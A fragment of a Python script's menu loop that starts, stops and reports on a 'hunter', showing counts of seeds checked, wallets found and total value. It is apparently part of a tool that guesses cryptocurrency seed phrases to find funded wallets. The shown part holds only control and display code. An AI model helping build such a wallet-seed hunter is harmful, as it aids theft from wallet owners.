                    asyncio.create_task(hunter.run())
                    print("🚀 HUNTING STARTED...")
                else:
                    print("⚠️ Already running!")
                    
            elif choice == "2":
                hunter.stop()
                print("🛑 HUNTING STOPPED")
                
            elif choice == "3":
                elapsed = time.time() - hunter.stats['start_time']
                speed = hunter.stats['seeds_checked'] / elapsed if elapsed > 0 else 0
                print(f"\n📊 ULTRA GOD STATS:")
                print(f"Seeds Checked: {hunter.stats['seeds_checked']}")
                print(f"Wallets Found: {hunter.stats['wallets_found']}")
                print(f"Total Value: {hunter.stats['total_value']:.6f}")
                print(f"Speed: {speed:.1f} seeds/sec")
                print(f"Running: {'YES' if hunter.running else 'NO'}")
                
            elif choice == "4":
                hunter.stop()
                await hunter.close()
                print("👋 EXITING ULTRA GOD MODE")
                break
            else:
                print("❌ Invalid option!")
                
            await asyncio.sleep(1)
            
    except KeyboardInterrupt:
        hunter.stop()
        await hunter.close()
        print("\n👋 EXITED BY USER")

if __name__ == "__main__":
    print("🔥 LOADING ULTRA GOD MODE...")
    asyncio.run(main())